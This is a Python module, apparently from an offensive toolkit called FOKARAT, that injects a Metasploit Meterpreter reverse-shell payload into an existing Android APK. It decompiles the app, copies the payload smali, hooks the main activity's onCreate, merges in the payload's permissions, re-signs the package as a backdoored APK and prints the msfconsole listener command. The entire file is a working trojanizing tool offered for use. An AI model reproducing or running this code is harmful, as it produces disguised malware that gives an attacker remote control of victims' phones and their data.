"""
FOKARAT - APK Injector v2.0
Injection automatique de payload Metasploit dans un APK existant.
"""
import os
import shutil
import subprocess
import tempfile
from core.module_interface import ModuleInterface
from core.logger import Logger
from core.utils import ensure_dir, which, safe_input

logger = Logger()


class ApkInjector(ModuleInterface):
    def get_metadata(self):
        return {
            "name": "APK Injector",
            "version": "2.0",
            "type": "android",
            "description": "Injecte un payload Metasploit dans un APK existant."
        }

    def run(self, config):
        # Vérification des outils
        needed = ["apktool", "msfvenom", "jarsigner", "keytool", "zipalign"]
        missing = [t for t in needed if not which(t)]
        if missing:
            logger.error(f"Outils manquants : {', '.join(missing)}")
            logger.info("Installez-les : sudo apt install apktool default-jdk zipalign")
            return {"status": "error", "message": f"Manquants: {missing}"}

        apk_in = safe_input("  [>] Chemin de l'APK original : ").strip()
        if not os.path.exists(apk_in):
            logger.error("APK introuvable.")
            return {"status": "error", "message": "APK introuvable"}

        # LHOST/LPORT
        default_ip = config.get("lhost") or "192.168.1.100"
        lhost = safe_input(f"  [>] LHOST [{default_ip}] : ") or default_ip
        config.set("lhost", lhost)

        default_port = config.get("lport", 4444)
        p = safe_input(f"  [>] LPORT [{default_port}] : ")
        try:
            lport = int(p) if p else int(default_port)
        except ValueError:
            lport = int(default_port)
        config.set("lport", lport)

        # Payload MSF
        print("\n  Type de payload :")
        print("    [1] android/meterpreter/reverse_tcp (recommandé)")
        print("    [2] android/meterpreter/reverse_https")
        print("    [3] android/meterpreter/reverse_http")
        pc = safe_input("  [>] Choix [1] : ") or "1"
        payloads = {
            "1": "android/meterpreter/reverse_tcp",
            "2": "android/meterpreter/reverse_https",
            "3": "android/meterpreter/reverse_http",
        }
        payload = payloads.get(pc, payloads["1"])

        out_dir = ensure_dir(config.get("output_dir", "output"))
        work_dir = tempfile.mkdtemp(prefix="fokarat_apk_")
        payload_apk = os.path.join(work_dir, "payload.apk")
        original_dir = os.path.join(work_dir, "original")
        payload_dir = os.path.join(work_dir, "payload")
        final_apk = os.path.join(out_dir, "fokarat_backdoored.apk")

        try:
            # === ÉTAPE 1 : Génération du payload APK ===
            logger.info("Étape 1/6 : Génération du payload APK...")
            subprocess.run([
                "msfvenom", "-p", payload,
                f"LHOST={lhost}", f"LPORT={lport}",
                "-o", payload_apk, "--platform", "android", "-a", "dalvik"
            ], check=True, capture_output=True)

            # === ÉTAPE 2 : Décompilation de l'APK original ===
            logger.info("Étape 2/6 : Décompilation de l'APK original...")
            subprocess.run(["apktool", "d", "-f", apk_in, "-o", original_dir],
                           check=True, capture_output=True)

            # === ÉTAPE 3 : Décompilation du payload ===
            logger.info("Étape 3/6 : Décompilation du payload...")
            subprocess.run(["apktool", "d", "-f", payload_apk, "-o", payload_dir],
                           check=True, capture_output=True)

            # === ÉTAPE 4 : Injection du Smali ===
            logger.info("Étape 4/6 : Injection du code Smali...")
            self._inject_smali(original_dir, payload_dir)

            # === ÉTAPE 5 : Modification du Manifest ===
            logger.info("Étape 5/6 : Modification du AndroidManifest.xml...")
            self._patch_manifest(original_dir, payload_dir)

            # === ÉTAPE 6 : Recompilation + Signature ===
            logger.info("Étape 6/6 : Recompilation et signature...")
            unsigned = os.path.join(work_dir, "unsigned.apk")
            subprocess.run(["apktool", "b", original_dir, "-o", unsigned],
                           check=True, capture_output=True)

            # Signature
            keystore = self._get_or_create_keystore()
            aligned = os.path.join(work_dir, "aligned.apk")
            subprocess.run(["zipalign", "-f", "4", unsigned, aligned],
                           check=True, capture_output=True)

            subprocess.run([
                "jarsigner", "-verbose", "-keystore", keystore,
                "-storepass", "android", "-keypass", "android",
                "-digestalg", "SHA1", "-sigalg", "MD5withRSA",
                aligned, "androiddebugkey"
            ], check=True, capture_output=True)

            shutil.move(aligned, final_apk)

            logger.success(f"APK backdooré : {final_apk}")
            logger.info(f"Payload : {payload}")
            logger.info(f"Listener : msfconsole -x 'use multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'")

            return {
                "status": "success",
                "apk_path": final_apk,
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
            }

        except subprocess.CalledProcessError as e:
            stderr = e.stderr.decode() if e.stderr else str(e)
            logger.error(f"Erreur : {stderr}")
            return {"status": "error", "message": stderr}
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def _inject_smali(self, original_dir, payload_dir):
        """Copie les fichiers Smali du payload dans l'APK original."""
        payload_smali = os.path.join(payload_dir, "smali")
        original_smali = os.path.join(original_dir, "smali")

        # Cherche le dossier smali principal
        if not os.path.exists(original_smali):
            for d in os.listdir(original_dir):
                if d.startswith("smali"):
                    original_smali = os.path.join(original_dir, d)
                    break

        msf_dest = os.path.join(original_smali, "com", "metasploit", "stage")
        os.makedirs(msf_dest, exist_ok=True)

        msf_src = os.path.join(payload_smali, "com", "metasploit", "stage")
        if os.path.exists(msf_src):
            for f in os.listdir(msf_src):
                shutil.copy(os.path.join(msf_src, f), msf_dest)

        # Hook dans le onCreate de l'activity principale
        self._hook_oncreate(original_smali)

    def _hook_oncreate(self, smali_dir):
        """Trouve et hook le onCreate de l'activity principale."""
        for root, _, files in os.walk(smali_dir):
            for f in files:
                if not f.endswith(".smali"):
                    continue
                path = os.path.join(root, f)
                with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                    content = fh.read()
                if ";->onCreate(Landroid/os/Bundle;)V" in content and "MainActivity" in f:
                    hook = ";->onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
                    new_content = content.replace(
                        ";->onCreate(Landroid/os/Bundle;)V",
                        hook, 1
                    )
                    with open(path, "w", encoding="utf-8") as fh:
                        fh.write(new_content)
                    logger.info(f"Hook injecté dans {f}")
                    return

    def _patch_manifest(self, original_dir, payload_dir):
        """Fusionne les permissions du payload dans le manifest original."""
        original_manifest = os.path.join(original_dir, "AndroidManifest.xml")
        payload_manifest = os.path.join(payload_dir, "AndroidManifest.xml")

        if not os.path.exists(original_manifest) or not os.path.exists(payload_manifest):
            return

        with open(payload_manifest, "r", encoding="utf-8") as f:
            payload_xml = f.read()

        import re
        permissions = re.findall(r'<uses-permission[^/]*/>', payload_xml)

        with open(original_manifest, "r", encoding="utf-8") as f:
            original_xml = f.read()

        # Insère les permissions manquantes
        insert_point = original_xml.find(">") + 1
        perms_to_add = ""
        for perm in permissions:
            if perm not in original_xml:
                perms_to_add += "\n    " + perm

        if perms_to_add:
            new_xml = original_xml[:insert_point] + perms_to_add + original_xml[insert_point:]
            with open(original_manifest, "w", encoding="utf-8") as f:
                f.write(new_xml)
            logger.info(f"{len(permissions)} permissions ajoutées.")

    def _get_or_create_keystore(self):
        """Récupère ou crée un keystore debug."""
        keystore = os.path.expanduser("~/.android/debug.keystore")
        if os.path.exists(keystore):
            return keystore

        os.makedirs(os.path.dirname(keystore), exist_ok=True)
        logger.info("Création d'un keystore debug...")
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", keystore,
            "-storepass", "android", "-keypass", "android",
            "-alias", "androiddebugkey", "-keyalg", "RSA",
            "-keysize", "2048", "-validity", "10000",
            "-dname", "CN=Android Debug,O=Android,C=US"
        ], check=True, capture_output=True)
        return keystore